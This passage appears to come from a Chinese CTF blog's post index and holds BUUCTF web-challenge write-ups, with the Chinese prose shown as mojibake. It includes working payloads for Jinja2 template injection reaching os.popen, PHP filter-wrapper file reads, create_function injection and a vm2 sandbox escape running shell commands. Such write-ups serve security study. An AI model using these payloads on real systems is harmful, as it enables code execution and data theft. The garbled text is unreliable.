åçš„jsonæ£€æŸ¥ï¼Œç„¶åå†file_get_contentsæ–‡ä»¶åŒ…å«åå†ç»•è¿‡ä¸€æ¬¡ï¼Œè¿™é‡Œå°±å¾ˆæ˜æ˜¾ï¼Œè‚¯å®šç”¨php://filter base64åŠ å¯†å°±å¥½äº†http://www.faqs.org/rfcs/rfc7159.htmlåœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæåˆ°äº†ä¸€ç‚¹ï¼šå¦‚æœé‡åˆ° æ‰€ä»¥è¿™é‡Œç”¨\\u ä¹Ÿå°±æ˜¯Unicodeçš„ç¼–ç å½¢å¼è¿›è¡Œç»•è¿‡è¯•è¯•çœ‹ï¼špayload: {&quot;page&quot;:&quot;\\u0070\\u0068\\u0070\\u003a\\u002f\\u002f\\u0066\\u0069\\u006c\\u0074\\u0065\\u0072\\u002f\\u0063\\u006f\\u006e\\u0076\\u0065\\u0072\\u0074\\u002e\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u002f\\u0072\\u0065\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u003d\\u002f\\u0066\\u006c\\u0061\\u0067&quot;} é¢ æˆåŠŸäº†ï¼Œæ„Ÿè§‰è¿™é¢˜å¯èƒ½éš¾åº¦ä¸å¤§=-= æ‰¾æ‰¾èµ„æ–™å°±è¡Œäº† [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown ä¸€å¼€å§‹çœ‹åˆ°url æ„Ÿè§‰åƒæ˜¯æ–‡ä»¶è¯»å–ï¼Œäºæ˜¯å°±éšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ä¸‹è½½æ–‡ä»¶ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ‰“å¼€ï¼Œäºæ˜¯æŠ“åŒ… å‘ç°ç›´æ¥å°±æœ‰flagäº†â€“åº”è¯¥æ˜¯éé¢„æœŸè§£çœ‹äº†ä¸€ä¸‹æ­£è§„wpï¼Œæœç„¶~é¦–å…ˆ/proc/self/cmdlineè¯»å–å½“å‰è¿è¡Œæ–‡ä»¶è¿›ç¨‹å¾—åˆ°app.pyï¼Œå¹¶è¯»å–è·å¾—æºç  from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index(): return render_template('search.html')@app.route('/page')def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == '__main__': app.run(host='0.0.0.0', port=8080) åˆ†æä¸€æ³¢ï¼š å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªè·¯ç”± å…³é”®æ˜¯ç¬¬ä¸‰ä¸ªæœ‰ä¸ªos.systemå¯ä»¥æ‰§è¡Œshellä½†æ˜¯éœ€è¦æˆ‘ä»¬åŒ¹é…å¯†é’¥ï¼Œä½†æ˜¯åœ¨ä¸€å¼€å§‹å°±è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨openæ‰“å¼€çš„ï¼Œä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ã€‚æˆ‘ä»¬è¯»è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹å°±å¥½äº†ï¼š /proc/self/fd/3 /proc/[pid]/fd æ˜¯ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€selfé‡Œé¢åºå·ä¸º3ï¼ˆ3æ˜¯fuzzå‡ºæ¥çš„ï¼‰ PyqGcLrhUhzQcdZiXqYiW+rUDJNn85fC9pMN3VEje7Q= è·å¾—å¯†é’¥ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œè¿æ¥ä¸€å¼€å§‹å°è¯•äº†ä¸€ä¸‹ å‘ç°keyä¸å¯¹ï¼Œå¾ˆçº³é—·ï¼Œurlencodeåå°±è¡Œäº†ï¼Œå‘ç°æœ‰ä¸ª+å·è¢«è§£æä¸ºç©ºæ ¼äº†ã€ã€ã€æœ‰ä¸ªå°å‘ï¼Œåé¢çš„shellæ„é€ å…ˆç•™ä¸ªå‘ï¼ŒæœåŠ¡å™¨ä¹°æ¥å¥½ä¹…æ²¡ç”¨äº†00å¿˜è®°å¯†ç äº†ï¼Œï¼Œï¼Œï¼Œ","link":"/2021/06/18/buuctf19/"},{"title":"buuctf20","text":"ä¹‹å‰çš„åšå®¢å¿˜è®°ä¿å­˜äº†ã€‚ã€‚ã€‚ã€‚å‘œå‘œå‘œå‘œ [watevrCTF-2019]Cookie Storecookieä¼ªé€ ï¼Œsessionæ˜¯å¾ˆæ˜æ˜¾çš„base64ç¼–ç ï¼ŒæŠŠé’±æ›´æ”¹ä¸€ä¸‹ï¼Œç„¶åidæ›´æ”¹ä¸€ä¸‹å°±å¯ä»¥æ‹¿åˆ°flagäº† [RootersCTF2019]I_&lt;3_Flaskä»‹ç»ä¸€ä¸ªå·¥å…·:Arjunå·¥å…·ä½¿ç”¨pythonè¿›è¡Œå®‰è£…ç®€å•ä»‹ç»ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ï¼š python3 arjun -u http://25aa54c2-e825-4339-b4cf-b794f03a4221.node4.buuoj.cn/ -m get -c 150 -d 0.5 https://www.freebuf.com/sectool/200175.html https://www.freebuf.com/sectool/200175.html æ‰«å‡ºæ³¨å…¥åä¸ºnameï¼Œæ¥ä¸‹æ¥ç›´æ¥æ„é€ æ³¨å…¥è¯­å¥è¿›è¡Œæ³¨å…¥ name={{%22%22.__class__.__base__.__subclasses__()[222]('cat /proc/self/cwd/flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} å…¶ä¸­ä¹Ÿæœ‰é‡åˆ°ä¸€ä¸ªéš¾ç‚¹ï¼Œå°±æ˜¯æ‰¾ä¸åˆ°flagï¼Œè¶Šæ˜¯å…ˆä½¿ç”¨äº†find -name â€œflag*â€æ‰¾äº†ä¸€ä¸‹flagï¼Œå‘ç°æ˜¯flag.txtï¼Œä½†ä¾æ—§ä¸çŸ¥é“è·¯å¾„ï¼Œäºæ˜¯ç¿»äº†ä¸€ä¸‹linuxé‡è¦ç›®å½•ï¼Œä½¿ç”¨/proc/self/cwd/åˆ—å‡ºäº†å½“å‰è¿è¡Œè¿›ç¨‹å·¥ä½œç›®å½•ï¼š ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰å®Œæ•´è·¯å¾„ï¼Œè¿™é‡Œå°±çŒœæƒ³äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªè·¯å¾„èƒ½ä¸èƒ½ç›´æ¥è®¿é—®å‘¢ï¼Ÿ æ²¡æƒ³åˆ°å±…ç„¶æ˜¯å¯ä»¥çš„æ‰€ä»¥å°±æœ‰äº†ä»¥ä¸Špayload å°tipså¯ä»¥é€šè¿‡/proc/self/cwd/ç›´æ¥catåˆ°å½“å‰å·¥ä½œè¿›ç¨‹çš„æ–‡ä»¶ä¾‹å¦‚/proc/self/cwd/flag.txt å°±å¯ä»¥ç›´æ¥catåˆ°æ­¤flagè€Œä¸éœ€è¦å»å¯»æ‰¾flagçš„ç»å¯¹è·¯å¾„ [BJDCTF2020]EzPHP &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); }if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; } } else die('fxck you! What do you want to do ?!');if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } if (file_get_contents($file) !== 'debu_debu_aqua') die(&quot;Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;} else{ die(&quot;fxck you! you don't know my password! And you don't know sha1! why you come here!&quot;);}if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=&quot;); } else { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; çœŸå¥½ï¼Œåˆå¿˜è®°ä¿å­˜åšå®¢äº†ã€‚ ç»•è¿‡å°ç»“1.$_SERVER['QUERY_STRING']ç»•è¿‡$_SERVER[â€˜QUERY_STRINGâ€™]æ¥å—æ•°æ®æ˜¯ä¸ä¼šè¿›è¡Œè§£ç çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†ä¼ å…¥çš„å†…å®¹è¿›è¡Œurlç¼–ç å³å¯ 2.preg_matchç»•è¿‡æ­£åˆ™åŒ¹é…ä½¿ç”¨%0Ajè¿›è¡Œæ¢è¡Œæ“ä½œå³å¯ç»•è¿‡ 3.REQUESTå€¼åŒ¹é…ç»•è¿‡ç”±äºpostçš„ä¼˜å…ˆçº§é«˜äºgetï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¼ ä¸€ä¸ªpostå€¼å°±å¯ä»¥ï¼Œå½“ç„¶æ˜¯è¦æ•°å­— 4.file_get_contentsç»•è¿‡æˆ‘ä»¬çŸ¥é“file_get_contentsæ˜¯ä»æ–‡æœ¬ä¸­è¯»å–å†…å®¹ï¼Œé‚£ä¹ˆè¿™é‡Œå°±éœ€è¦ä½¿ç”¨phpçš„ä¼ªåè®®äº†ï¼Œä½¿ç”¨dataå³å¯æ ¼å¼ä¸ºdata:text/plain;+æ–‡æœ¬ 5.shaç»•è¿‡ä½¿ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡å³å¯å°±ä¼ å…¥æ•°ç»„å°±è¡Œ ä½†æ˜¯å¾ˆå¥‡æ€ª å½“æˆ‘åœ¨ç»•è¿‡ç¬¬ä¸‰ä¸ªçš„æ—¶å€™å‘ç°å°±å‡ºé—®é¢˜äº†ï¼Œï¼Œåœ¨æœ¬åœ°å°è¯•ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œä½†æ˜¯åˆ°äº†buuä¸Šé¢å°±æ˜¯ç»•ä¸è¿‡ï¼Ÿçœ‹äº†ä¸€ä¸‹wp è€ƒç‚¹åœ¨äºåé¢create_functionçš„æ„å»ºï¼Œäºæ˜¯å°±ç›´æ¥æ¥å­¦å­¦å§ create_functionçš„ä½¿ç”¨1.ç®€ä»‹é€‚ç”¨èŒƒå›´ï¼šPHP 4&gt; = 4.0.1ï¼ŒPHP 5ï¼ŒPHP 7 åŠŸèƒ½ï¼šæ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›å”¯ä¸€åç§°ã€‚ è¯­æ³•ï¼š create_function(string $args,string $code)string $args å£°æ˜çš„å‡½æ•°å˜é‡éƒ¨åˆ†string $code æ‰§è¡Œçš„æ–¹æ³•ä»£ç éƒ¨åˆ† 2.åŠŸèƒ½åˆ†ææ¡ˆä¾‹&lt;?php$newfunc = create_function('$a,$b', 'return &quot;ln($a) + ln($b) = &quot; . log($a * $b);');echo &quot;New anonymous function: $newfunc\\n&quot;;echo $newfunc(2, M_E) . &quot;\\n&quot;;?&gt; 3.æ‰§è¡ŒåŸç†åˆ†æcreate_funtion()ä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaæ ·å¼ï¼‰ã€‚æ­¤å¤„åˆ›å»ºäº†ä¸€ä¸ªlambda_1çš„å‡½æ•°ï¼Œåœ¨ç¬¬ä¸€ä¸ªechoä¸­æ˜¾ç¤ºå‡ºåå­—ï¼Œå¹¶åœ¨ç¬¬äºŒä¸ªechoè¯­å¥ä¸­æ‰§è¡Œäº†æ­¤å‡½æ•° create_function()å‡½æ•°ä¼šåœ¨å†…éƒ¨æ‰§è¡Œeval()ï¼Œæˆ‘ä»¬å‘ç°æ˜¯æ‰§è¡Œäº†åé¢çš„returnè¯­å¥ï¼Œå±äºcreate_function()ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°string$codeä½ç½® function lambda_1($a, $b){ return $a+$b;} 4.æœ¬é¢˜åˆ©ç”¨è¯¦è§£æœ¬é¢˜åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œ: $code('', $arg); ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºï¼Œç¬¬äºŒä¸ªä¸ºå¯æ§å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ æ³¨å…¥è¯­å¥ï¼Œçœ‹ä¸‹$argæ¥è‡ªå“ªé‡Œã€‚ã€‚é€›äº†ä¸€åœˆï¼Œå‘ç°å“ªé‡Œéƒ½æ²¡æœ‰å‘ç°äº†extract() å‡½æ•° extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚ é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ è¯¥å‡½æ•°è¿”å›æˆåŠŸè®¾ç½®çš„å˜é‡æ•°ç›®ã€‚ æ‰€ä»¥æˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸ªflagæ¥æ”¹å˜argçš„å€¼é¦–å…ˆï¼Œæ„é€ å‡ºæ¥çš„è¯­å¥è¦å…·æœ‰å˜æˆä¸‹é¢è¿™æ ·: function a{ return $a;}xxx;//} ç¿»è¯‘æˆæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥å³ä¸ºï¼š &amp;flag[arg]=}a();//&amp;flag[code]=create_function è€Œè¿™ä¸ªaåé¢çš„å‡½æ•°æˆ‘ä»¬è¿˜æœ‰å¾…æ„å»ºå°±æ˜¯äº†ã€‚ã€‚æ¥ä¸‹çš„éš¾ç‚¹æ˜¯1.æ— æ³•ä½¿ç”¨system()ç­‰å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿‡æ»¤äº†flagç­‰å…³é”®å­—ï¼Œè¿‡æ»¤äº†printç­‰å…³é”®å­—ä½†æ˜¯,åœ¨è¿™é‡Œè¿˜åŒ…å«äº† { include &quot;flag.php&quot;; $code('', $arg); } ?&gt; è¿™é‡Œçš„è¿™ä¸ªæ€è·¯å°±å¾ˆå¥‡å¦™äº†åŒ…å«äº†è¿™ä¸ªæ–‡ä»¶ï¼Œä»£è¡¨å¯ä»¥ä½¿ç”¨é‡Œé¢çš„å˜é‡ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•åœ¨ä¸æŒ‡å®šå˜é‡åç§°çš„æƒ…å†µä¸‹è¾“å‡ºå˜é‡çš„å€¼â€”â€”get_defined_vars()å‡½æ•°ç”¨æ¥è¾“å‡ºæ‰€æœ‰çš„å˜é‡å’Œå€¼ æ‰€ä»¥ä½¿ç”¨çš„payloadä¸ºï¼š &amp;flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function ä½†æ˜¯æ­¤æ—¶åªèƒ½è·å–åˆ°å‡çš„flagï¼Œç»§ç»­æ„é€ : &amp;flag[arg]=}require(base64_decode(MWZsYWcucGhw));var_dump(get_defined_vars());//&amp;flag[code]=create_function ç”±äºç¯å¢ƒå—é™æ²¡æ³•å¤ç°å®Œå…¨ï¼Œä½†æ˜¯çœ‹äº†å¸ˆå‚…ä»¬çš„æ–‡ç« æ„Ÿè§‰è§†é‡å¼€æ‹“äº†ä¸å°‘ éé¢„æœŸè§£1å–å/å¼‚æˆ–ç»•è¿‡+ä¼ªåè®®è¯»æºç payload: require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));// ä¸­é—´çš„å–åç»“æœä¸ºï¼š php://filter/read=convert.base64-encode/resource=1flag.php https://www.gem-love.com/ctf/770.html#%E8%80%83%E7%82%B96%EF%BC%8Ccreatefunction()%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5 å°ç»“ï¼šè¿™é¢˜å¾ˆå¯æƒœï¼Œä¼¼ä¹æ˜¯ç¯å¢ƒå‡ºäº†ç‚¹é—®é¢˜æ‰€ä»¥æ²¡åŠæ³•åšåˆ°æœ€åä¸€æ­¥ï¼Œä½†æ˜¯ä¹Ÿæ”¶è·äº†å¾ˆå¤šï¼Œå°¤å…¶æ˜¯æœ€åæ–‡ä»¶åŒ…å«çš„æ€è·¯ï¼Œçœ¼å‰ä¸€äº®ï¼Œä»¥åŠéé¢„æœŸè§£è®©æˆ‘æ‡‚å¾—äº†å…¶å®å­—ç¬¦è¿‡æ»¤ï¼Œå¼‚æˆ–å–åæ“ä½œå¾€å¾€ä¼šæœ‰ä¸ä¸€èˆ¬çš„æ”¶è·ï¼Œ","link":"/2021/06/21/buuctf20/"},{"title":"python urllibåº“å­¦ä¹ ","text":"åŸºç¡€ä»‹ç»åŸæ¥è¿™ä¸ªå’Œrequestè¿™ä¸ªåº“æ˜¯åŒç±»å‹çš„åº“ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹å­æ¨¡å—ï¼ŒåŒ…æ‹¬ï¼š1.urllib.requestæ‰“å¼€åè¯»å–urlå†…å®¹2.urllib.erroråŒ…å«ç”±urllib.requestæŠ›å‡ºçš„å¼‚å¸¸ç±»3.urllib.parseè§£æurl4.urllib.robotparserè§£ærobots.txt files","link":"/2021/07/10/python-urllib%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"title":"buuctf21","text":"[CISCN2019 åä¸œå—åŒº]Double SecretçŒœå‡ºç›®å½•æ˜¯secretï¼Œç„¶åå‚æ•°ä¹Ÿæ˜¯secretæ¥ä¸‹æ¥è¾“å…¥å‚æ•°å‘ç°æ¯æ¬¡å‚æ•°çš„å›æ˜¾æ˜¯ä¸ä¸€æ ·ï¼Œåƒæ˜¯æœ‰æŸç§åŠ å¯†å‘ç°è¾“å…¥çš„å­—ç¬¦æ¯”è¾ƒå¤šçš„æ—¶å€™å°±ä¼šæŠ¥é”™äº† if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see'rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;) #è§£å¯†deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!'return a æ„Ÿè§‰è¿™æ˜¯å…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¶‰åŠäº†è§£å¯†å†…å®¹ æ³¨æ„å…³é”®ç‚¹ï¼š a=render_template_string()å‡½æ•°è¯´æ˜å¯ä»¥æ¸²æŸ“æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å­˜åœ¨sstiæ³¨å…¥ æ‰€ä»¥æ¥ä¸‹æ¥çš„å…³é”®æ˜¯åˆ©ç”¨rc4åŠ å¯†çš„å¯†æ–‡ï¼Œå°†æˆ‘ä»¬çš„payloadè¿›è¡ŒåŠ å¯†åè¾“å…¥ï¼Œæ¥ä¸‹æ¥å°±ä¼šè‡ªåŠ¨è¿›è¡Œè§£å¯†ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„payloadäº†~ ç½‘ä¸Šæ‰¾çš„åŠ å¯†è„šæœ¬: import base64from urllib import parsedef rc4_main(key=&quot;init_key&quot;,message=&quot;init_message&quot;): s_box=rc4_init_sbox(key) crypt=str(rc4_excrypt(message,s_box)) return cryptdef rc4_init_sbox(key): s_box=list(range(256)) j=0 for i in range(256): j=(j+s_box[i]+ord(key[i%len(key)]))%256 s_box[i],s_box[j]=s_box[j],s_box[i] return s_boxdef rc4_excrypt(plain,box): res=[] i=j=0 for s in plain: i=(i+1)%256 j=(j+box[i])%256 box[i],box[j]=box[j],box[i] t=(box[i]+box[j])%256 k=box[t] res.append(chr(ord(s)^k)) cipher=&quot;&quot;.join(res) return(str(base64.b64encode(cipher.encode('utf-8')),'utf-8'))key=&quot;HereIsTreasure&quot;message=input(&quot;è¯·è¾“å…¥æ˜æ–‡:\\n&quot;)enc_base64=rc4_main(key,message)enc_init=str(base64.b64decode(enc_base64),'utf-8')enc_url=parse.quote(enc_init)print(&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;+enc_url) ç”¨æ‰‹æ‰“äº†ä¸€æ¬¡ï¼Œè¿˜æ˜¯å­¦åˆ°äº†äº›ä¸œè¥¿çš„ç„¶åè¾“å…¥ {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;)}}{% endif %}{% endfor %} å³å¯æŸ¥çœ‹åˆ°ç›®å½• {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('cat flag.txt').read()&quot;)}}{% endif %}{% endfor %} [HFCTF2020]JustEscapeä¸‹é¢æœ‰æç¤º è®©æˆ‘ä»¬åˆ°run.phpé‡Œé¢è¾“å‡ºcodeäºæ˜¯â€”â€” ä»¥ä¸ºæ˜¯sstiæ³¨å…¥æ‰€ä»¥è¾“äº†ç‚¹å†…å®¹ï¼Œå‘ç°åé¢å‡ºäº†è¿™ç©æ„ï¼Ÿerror.stack å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæè¿°ä»£ç ä¸­ Error è¢«å®ä¾‹åŒ–çš„ä½ç½®è¾“å…¥Error().stackå¾—åˆ°: Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªjsçš„vmæ²™ç›’ç›´æ¥æ‰¾åŸå‹åˆ©ç”¨é“¾æ¥æ‰“å°±è¡Œ æœ€æ–°çš„æ²™ç®±é€ƒé€¸çš„pocã€‚ https://github.com/patriksimek/vm2/issues/225 '(' + function(){ TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try{ Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; }catch(e){ return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); }}+')()';try{ console.log(new VM().run(untrusted));}catch(x){ console.log(x);} ä½†æ˜¯å› ä¸ºæœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ï¼Œå¯ä»¥åŠ ä¸Šåå¼•å·è¿›è¡Œç»•è¿‡: /run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})() è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯å°†å…³é”®å­—ï¼ˆæ¯”å¦‚prototypï¼‰æ”¹ä¸ºï¼š${${prototyp}e} (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString(); } })() payloadåˆ†æï¼šåˆšå­¦node.jsçš„æ²™ç®±é€ƒé€¸å•¥ä¹Ÿç¼–ä¸å‡ºæ¥ï¼Œäºæ˜¯å°±ç”¨payloadæ¥åˆ†æä¸€ä¸‹ '(' + function(){ TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try{ Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; }catch(e){ return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); }}+')()';try{ console.log(new VM().run(untrusted));}catch(x){ console.log(x);} å‚è€ƒ: https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/https://github.com/patriksimek/vm2/issues/225 [NPUCTF2020]ezincludeæŸ¥çœ‹æºç ï¼Œçœ‹åˆ°cookie ç›´æ¥ä¼ pass ç„¶åè¿›å»ï¼ŒæŠ“åŒ…æ‰èƒ½çœ‹åˆ°å…¶ä»–ä¿¡æ¯ çœ‹åˆ°æ–‡ä»¶åŒ…å«å°±è¦æƒ³åˆ°ä¼ªåè®®ï¼ï¼š php://filter/read=convert.base64-encode/resource=flflflflag.php &lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET['file'];if(preg_match('/data|input|zip/is',$file)){ die('nonono');}@include($file);echo 'include($_GET[&quot;file&quot;])';?&gt;&lt;/body&gt;&lt;/htmlPgo è¿‡æ»¤äº†dataå’Œinputä¸èƒ½ç”¨å‘½ä»¤æ‰§è¡Œäº†ï¼Œä¹Ÿä¸èƒ½ç›´æ¥å†™å…¥æ–‡ä»¶ PHP7.0bugphp7.0çš„bugï¼š ?file=php://filter/string.strip_tags/resource=/etc/passwd ä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp 